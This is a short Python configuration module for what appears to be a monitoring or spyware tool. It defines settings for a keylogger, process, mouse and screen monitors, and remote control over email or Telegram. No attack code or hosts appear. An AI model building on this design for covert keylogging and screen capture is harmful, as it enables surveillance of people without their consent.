from dataclasses import dataclass
import enum

from ..core import components


class _CtrlMode(enum.Enum):
    EMAIL = 0
    TELEGRAM = 1


@dataclass
class _General:
    controlMode: _CtrlMode
    monitorEvery: int
    saveDataTo: str


@dataclass
class Configuration:
    general: _General
    keylogger: components.keylogger.Configuration
    processMntr: components.process.Configuration
    mouseMntr: components.mouse.Configuration
    screenMntr: components.screen.Configuration
